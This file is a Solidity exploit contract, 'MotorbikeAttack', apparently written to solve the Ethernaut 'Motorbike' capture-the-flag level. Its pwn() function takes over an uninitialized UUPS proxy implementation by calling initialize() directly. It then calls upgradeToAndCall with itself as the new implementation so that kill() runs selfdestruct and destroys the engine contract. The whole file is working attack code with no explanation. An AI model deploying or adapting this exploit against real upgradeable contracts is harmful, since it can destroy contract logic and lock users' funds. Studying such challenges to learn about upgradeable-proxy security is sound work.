// SPDX-License-Identifier: MIT
pragma solidity <0.7.0;

interface IEngine {
    function initialize() external;

    function upgradeToAndCall(address newImplementation, bytes memory data)
        external
        payable;
}

contract MotorbikeAttack {
    IEngine engine;

    constructor(address _engine) public {
        engine = IEngine(_engine);
    }

    function pwn() external {
        IEngine(engine).initialize();
        IEngine(engine).upgradeToAndCall(
            address(this),
            abi.encodeWithSelector(this.kill.selector)
        );
    }

    function kill() external {
        selfdestruct(payable(address(0)));
    }
}
